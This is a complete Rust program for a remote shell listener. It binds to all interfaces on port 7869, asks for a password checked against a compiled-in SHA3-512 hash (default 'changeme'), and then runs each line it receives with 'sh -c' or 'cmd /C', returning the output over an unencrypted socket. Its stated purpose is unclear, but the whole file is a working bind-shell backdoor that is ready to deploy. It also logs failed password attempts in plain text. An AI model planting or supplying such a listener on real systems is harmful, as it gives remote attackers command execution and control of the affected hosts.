use proc_hash::include_sha3;
use sha3::{Digest, Sha3_512};
use std::{
    io::{BufRead, BufReader, Read, Write},
    net::TcpListener,
    process::{Command, Output},
};

const PORT: &str = "7869";
fn verify_sha3(attempt: &str, actual: &str) -> bool {
    let mut hasher = Sha3_512::new();
    hasher.update(attempt);
    let hash = format!("{:x}", hasher.finalize());
    hash == actual
}
fn main() {
    #[allow(non_snake_case)]
    let PASS = include_sha3!("changeme"); // CHANGE THIS
    let host = &*format!("0.0.0.0:{}", PORT);
    loop {
        println!("Binding to {}", host);
        let listener = TcpListener::bind(host).expect("Address unavailable");
        let mut authenticated: bool = false;
        println!("Waiting for connection");
        match listener.accept() {
            Ok((mut sock, addr)) => {
                println!("Got connection from {}", addr);
                loop {
                    let mut reader = BufReader::new(&sock);
                    let mut msg: String = String::new();
                    match reader.read_line(&mut msg) {
                        Ok(0) => {
                            // Sock killed. Restart listener
                            println!("Socket with {} closed", addr);
                            break;
                        }
                        Ok(_) => {
                            msg.pop(); // Remove newline at the end
                            if !authenticated {
                                println!("Not authenticated. Waiting for password");
                                // Not authenticated. Start auth cycle
                                if verify_sha3(&msg, PASS) {
                                    authenticated = true;
                                    println!("Auth success");
                                    let _ = sock.write(b"Authenticated!\n");
                                    continue;
                                } else {
                                    std::thread::sleep(std::time::Duration::from_millis(20));
                                    println!("Wrong password: {}", &msg);
                                    continue;
                                }
                            } else {
                                // Authentication works. Start interpreting commands
                                let _ = sock.write(exec(msg).as_bytes());
                            }
                        }
                        Err(err) => {
                            println!("Error: {}", err);
                            continue;
                        }
                    }
                }
            }
            Err(err) => {
                println!("Error: {}", err);
                continue;
            }
        }
    }
}

fn exec(cmd: String) -> String {
    let (command, args) = if cfg!(windows) {
        ("cmd", vec!["/C", &cmd])
    } else {
        ("sh", vec!["-c", &cmd])
    };
    println!("Running {}", command);
    let output: Output = match Command::new(command).args(&args).output() {
        Ok(output) => output,
        Err(e) => return format!("Failed to run command '{}': {}", cmd, e),
    };

    let mut result = String::new();
    let mut stdout = std::io::BufReader::new(output.stdout.as_slice());
    let mut stderr = std::io::BufReader::new(output.stderr.as_slice());

    stdout.read_to_string(&mut result).unwrap();
    stderr.read_to_string(&mut result).unwrap();

    result
}
